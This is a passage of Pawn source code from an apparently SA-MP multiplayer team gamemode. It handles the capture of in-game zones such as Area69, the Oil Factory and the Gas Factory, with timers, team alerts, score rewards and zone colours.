			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*Area69 is under attack!");
			    }
			    else if(tCP[BIG] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*Area69 is under attack!");
			    }
			    else if(tCP[BIG] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*Area69 is under attack!");
				}
				else if(tCP[BIG] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Area69 is under attack!");
				}
				else if(tCP[BIG] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Area69 is under attack!");
				}
				else if(tCP[BIG] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_ML, green,"*Area69 is under attack!");
				}
				else if(tCP[BIG] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][BIG] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock Area69Captured(playerid)
{
	Captured[playerid][BIG] = 1;
	UnderAttack[BIG] = 0;
	KillTimer(timer[playerid][BIG]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][BIG] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"Area69\" you received +5 scores and +$5000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][BIG] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"Area69"cwhite"! You received +2 score for it!");
		   GivePlayerScore(i, 2);
	   }
	}
	//==========================================================================
	tCP[BIG] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[BIG]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[BIG], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       GangZoneShowForAll(Zone[BIG], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[BIG], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[BIG], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[BIG], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[BIG], TEAM_ZONE_NEPAL_COLOR);
    }
    else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[BIG], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"Area69\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingArea69(playerid)
{
	Captured[playerid][BIG] = 1;
	UnderAttack[BIG] = 0;
	KillTimer(timer[playerid][BIG]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][BIG] = 25;
    GangZoneStopFlashForAll(Zone[BIG]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][BIG] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward Area69(playerid);
public Area69(playerid)
{
	Area69Captured(playerid);
	return 1;
}
//==============================================================================
stock ActiveArmy(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[ARMY] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[ARMY] = 1;
			 	timer[playerid][ARMY] = SetTimerEx("Army", 25000, false,"i",playerid);
			 	Captured[playerid][ARMY] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[ARMY], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[ARMY], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[ARMY], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[ARMY], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[ARMY], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[ARMY], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[ARMY], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[ARMY] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*Army Restaurant is under attack!");
			    }
			    else if(tCP[ARMY] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*Army Restaurant is under attack!");
			    }
			    else if(tCP[ARMY] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*Army Restaurant is under attack!");
			    }
			    else if(tCP[ARMY] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*Army Restaurant is under attack!");
				}
				else if(tCP[ARMY] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Army Restaurant is under attack!");
				}
				else if(tCP[ARMY] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Army Restaurant is under attack!");
				}
				else if(tCP[ARMY] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_ML, green,"*Army Restaurant is under attack!");
				}
				else if(tCP[ARMY] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][ARMY] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock ArmyCaptured(playerid)
{
	Captured[playerid][ARMY] = 1;
	UnderAttack[ARMY] = 0;
	KillTimer(timer[playerid][ARMY]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][ARMY] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"Army Restaurant\" you received +5 scores and +$5000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][ARMY] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"Army Restaurant"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[ARMY] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[ARMY]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_NEPAL_COLOR);
    }
    else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"Army Restaurant\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingArmy(playerid)
{
	Captured[playerid][ARMY] = 1;
	UnderAttack[ARMY] = 0;
	KillTimer(timer[playerid][ARMY]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][ARMY] = 25;
    GangZoneStopFlashForAll(Zone[ARMY]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][ARMY] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward Army(playerid);
public Army(playerid)
{
	ArmyCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActivePetrol(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[PETROL] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[PETROL] = 1;
			 	timer[playerid][PETROL] = SetTimerEx("Petrol", 25000, false,"i",playerid);
			 	Captured[playerid][PETROL] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[PETROL], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[PETROL], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[PETROL], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[PETROL], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[PETROL], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[PETROL], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[PETROL], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[PETROL] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*Army petrol bunk is under attack!");
			    }
			    else if(tCP[PETROL] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*Army petrol bunk is under attack!");
			    }
			    else if(tCP[PETROL] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*Army petrol bunk is under attack!");
			    }
			    else if(tCP[PETROL] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*Army petrol bunk is under attack!");
				}
				else if(tCP[PETROL] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Army petrol bunk is under attack!");
				}
				else if(tCP[PETROL] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Army petrol bunk is under attack!");
				}
				else if(tCP[PETROL] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_ML, green,"*Army petrol bunk is under attack!");
				}
				else if(tCP[PETROL] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][PETROL] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock PetrolCaptured(playerid)
{
	Captured[playerid][PETROL] = 1;
	UnderAttack[PETROL] = 0;
	KillTimer(timer[playerid][PETROL]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][PETROL] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"Army Petrol Bunk\" you received +5 scores and +$5000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][PETROL] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"Army Petrol Bunk"cwhite"! You received +2 score for it!");
		   GivePlayerScore(i, 2);
	   }
	}
	//==========================================================================
	tCP[PETROL] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[PETROL]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_NEPAL_COLOR);
    }
	else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"Army Petrol Bunk\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingPetrol(playerid)
{
	Captured[playerid][PETROL] = 1;
	UnderAttack[PETROL] = 0;
	KillTimer(timer[playerid][PETROL]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][PETROL] = 25;
    GangZoneStopFlashForAll(Zone[PETROL]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][PETROL] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward Petrol(playerid);
public Petrol(playerid)
{
	PetrolCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveOil(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[OIL] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[OIL] = 1;
			 	timer[playerid][OIL] = SetTimerEx("Oil", 25000, false,"i",playerid);
			 	Captured[playerid][OIL] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[OIL], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[OIL], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[OIL], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[OIL], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[OIL], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[OIL], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[OIL], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[OIL] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*Oil Factory is under attack!");
			    }
			    else if(tCP[OIL] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*Oil Factory is under attack!");
			    }
			    else if(tCP[OIL] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*Oil Factory is under attack!");
			    }
			    else if(tCP[OIL] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*Oil Factory is under attack!");
				}
				else if(tCP[OIL] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Oil Factory is under attack!");
				}
                else if(tCP[OIL] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Oil Factory is under attack!");
				}
				else if(tCP[OIL] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_ML, green,"*Oil Factory is under attack!");
				}
				else if(tCP[OIL] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][OIL] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock OilCaptured(playerid)
{
	Captured[playerid][OIL] = 1;
	UnderAttack[OIL] = 0;
	KillTimer(timer[playerid][OIL]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][OIL] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"Oil Factory\" you received +5 scores and +$5000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][OIL] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"Oil Factory"cwhite"! You received +2 score for it!");
		   GivePlayerScore(i, 2);
	   }
	}
	//==========================================================================
	tCP[OIL] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[OIL]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[OIL], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       GangZoneShowForAll(Zone[OIL], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[OIL], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[OIL], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[OIL], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[OIL], TEAM_ZONE_NEPAL_COLOR);
    }
    else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[OIL], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"Oil Factory\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingOil(playerid)
{
	Captured[playerid][OIL] = 1;
	UnderAttack[OIL] = 0;
	KillTimer(timer[playerid][OIL]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][OIL] = 25;
    GangZoneStopFlashForAll(Zone[OIL]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][OIL] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward Oil(playerid);
public Oil(playerid)
{
	OilCaptured(playerid);
	return 1;
}
//==============================================================================
//==============================================================================
stock ActiveDesert(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[DESERT] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[DESERT] = 1;
			 	timer[playerid][DESERT] = SetTimerEx("Desert", 25000, false,"i",playerid);
			 	Captured[playerid][DESERT] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[DESERT], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[DESERT], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[DESERT], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[DESERT], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[DESERT], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[DESERT], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[DESERT], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[DESERT] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*Gas Factory is under attack!");
			    }
			    else if(tCP[DESERT] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*Gas Factory is under attack!");
			    }
			    else if(tCP[DESERT] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*Gas Factory is under attack!");
			    }
			    else if(tCP[DESERT] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*Gas Factory is under attack!");
				}
				else if(tCP[DESERT] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Gas Factory is under attack!");
				}
				else if(tCP[DESERT] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Gas Factory is under attack!");
				}
				else if(tCP[DESERT] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Gas Factory is under attack!");
				}
				else if(tCP[DESERT] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][DESERT] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock DesertCaptured(playerid)
{
	Captured[playerid][DESERT] = 1;
	UnderAttack[DESERT] = 0;
	KillTimer(timer[playerid][DESERT]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][DESERT] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"Gas Factory\" you received +5 scores and +$5000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][DESERT] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"Gas Factory"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[DESERT] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[DESERT]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_NEPAL_COLOR);
    }
    else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"Gas Factory\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingDesert(playerid)
{
	Captured[playerid][DESERT] = 1;
	UnderAttack[DESERT] = 0;
	KillTimer(timer[playerid][DESERT]);
